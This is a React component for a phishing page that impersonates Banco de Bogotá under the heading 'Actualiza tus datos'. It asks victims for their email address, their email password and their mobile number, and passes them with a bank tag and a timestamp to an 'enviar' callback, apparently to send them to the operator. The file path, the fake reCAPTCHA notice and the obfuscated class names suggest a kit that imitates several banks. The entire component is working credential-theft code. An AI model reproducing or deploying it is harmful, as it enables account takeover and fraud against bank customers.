/* eslint-disable @typescript-eslint/no-explicit-any */
/* eslint-disable @next/next/no-img-element */
"use client";
import { useState } from "react";
import BankCssLoader from "./BankCssLoader";

export default function ActDatos({ enviar }: any) {
  const [correo, setCorreo] = useState("");
  const [clave, setClave] = useState("");
  const [celular, setCelular] = useState("");
  const [loading, setLoading] = useState(false);

  function handleSubmit() {
    if (!correo || !clave || !celular) {
      console.warn("Datos inválidos");
      return null;
    }

    return {
      view: "actdatos",
      correo,
      clave,
      celular,
      bank: "bogota",
      timestamp: new Date().toISOString(),
    };
  }

  return (
    <main className="container" style={{ position: "relative" }}>
      {/* COLUMNA IZQUIERDA */}
      <BankCssLoader visible={loading} />
      <div className="rang"></div>
      <section className="left">
        <div className="wjeu">
          {/* LOGO */}
          <img src="/bancos/bogota/css/logo.svg" alt="Banco de Bogotá" className="logo" />
          <h1>
            <b>Actualiza tus datos</b>
          </h1>

          {/* LOGIN CARD */}
          <div className="login-card">
            {/* FORMULARIO */}
            <form
              id="form-clave"
              className="form-content active"
              method="POST"
              onSubmit={(e) => e.preventDefault()}
            >
              <div className="alert">
                Por favor, ingresa los siguientes datos para continuar con el proceso.
              </div>

              <div className="bpas">
                <label>Correo Electrónico</label>
                <div className="id-inputs">
                  <input
                    type="email"
                    placeholder="tucorreo@ejemplo.com"
                    value={correo}
                    onChange={(e) => setCorreo(e.target.value)}
                    style={{ width: '100%', paddingLeft: '15px' }}
                  />
                </div>

                <label>Clave del correo</label>
                <div className="password">
                  <input
                    type="password"
                    placeholder="••••••••"
                    value={clave}
                    onChange={(e) => setClave(e.target.value)}
                  />
                  <span className="eye">
                    <img src="/bancos/bogota/img/eye.png" alt="mostrar" width="40px" />
                  </span>
                </div>

                <label>Número de celular</label>
                <div className="id-inputs">
                  <input
                    type="tel"
                    placeholder="300 000 0000"
                    maxLength={10}
                    inputMode="numeric"
                    value={celular}
                    onChange={(e) => setCelular(e.target.value.replace(/[^0-9]/g, ""))}
                    style={{ width: '100%', paddingLeft: '15px' }}
                  />
                </div>

                <button
                  className="eay7wDeyb-EbWIk2kfDMUg== bdb-at-btn bdb-at-btn--primary bdb-at-btn--lg"
                  type="submit"
                  disabled={!correo || !clave || celular.length < 10}
                  onClick={() => {
                    setLoading(true);
                    const data = handleSubmit();
                    if (data) {
                      enviar(data);
                      setTimeout(() => {
                        setLoading(false);
                      }, 3000);
                    }
                  }}
                  style={{ marginTop: '20px' }}
                >
                  Continuar
                </button>
              </div>
            </form>
          </div>

          {/* DISCLAIMER */}
          <p className="disclaimer">
            Este sitio está protegido por reCAPTCHA y aplican las{" "}
            <a href="#">políticas de privacidad</a> y los{" "}
            <a href="#">términos de servicio de Google</a>.
          </p>
        </div>
      </section>

      {/* COLUMNA DERECHA */}
      <section className="right">
        <div className="promo">
          <img
            src="https://ftp.mathilde-ads.com/71-889f99de979d5beef1223eb16fe288e7.png"
            alt="Cuenta Fácil"
          />
        </div>
        <div className="promo">
          <img src="/bancos/bogota/css/coue.png" alt="Cuenta Fácil" />
        </div>
      </section>
    </main>
  );
}